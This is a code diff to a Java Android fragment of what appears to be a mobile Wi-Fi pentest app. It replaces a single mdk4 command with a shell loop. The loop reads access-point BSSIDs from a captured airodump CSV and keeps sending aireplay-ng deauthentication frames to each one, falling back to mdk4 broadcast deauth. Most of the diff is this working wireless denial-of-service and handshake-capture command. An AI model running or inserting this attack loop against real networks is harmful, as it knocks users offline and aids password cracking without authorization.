@@ -1051,16 +1051,26 @@ public class Wifi extends Fragment {
                     core.monitorManager.enableMonitorMode(deauthIface);
                     deauthIface = core.getDeauthInterface();
                 }
-                mdk4 = new AdvancedProcess(activity, context, "mdk4 " + deauthIface + " d", true) {
+                // Mass deauth: prefer aireplay-ng -0 per-AP (surgical — cycles the discovered
+                // BSSIDs from the handshakenow CSV), falling back to the proven mdk4 broadcast
+                // deauth if the guest lacks aireplay-ng. The airodump --output-format pcap,csv
+                // command above is left untouched so the GUI's CSV parsing keeps working.
+                String deauthCmd = "if command -v aireplay-ng >/dev/null 2>&1; then " +
+                        "while true; do " +
+                        "for b in $(awk -F, '/Station MAC/{exit} NR>1 {print $1}' /sdcard/Stryker/hs/handshakenow-01.csv 2>/dev/null | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | sort -u); do " +
+                        "timeout 4 aireplay-ng --ignore-negative-one -0 3 -a \"$b\" " + deauthIface + " >/dev/null 2>&1; " +
+                        "done; sleep 3; done; " +
+                        "else mdk4 " + deauthIface + " d; fi";
+                mdk4 = new AdvancedProcess(activity, context, deauthCmd, true) {
                     @Override
                     public void onFinished(ArrayList<String> outputList) {
-                        core.toaster("Mdk4 stopped");
+                        core.toaster("Deauth stopped");
                         packet[0] = "Deauth stopped due critical error";
                     }
 
                     @Override
                     public void onNewLine(String line) {
-                        if (line.contains("Packets sent")) {
+                        if (line.contains("Packets sent") || line.contains("Sending DeAuth") || line.contains("Sending 64")) {
                             packet[0] = line;
                         }
                     }
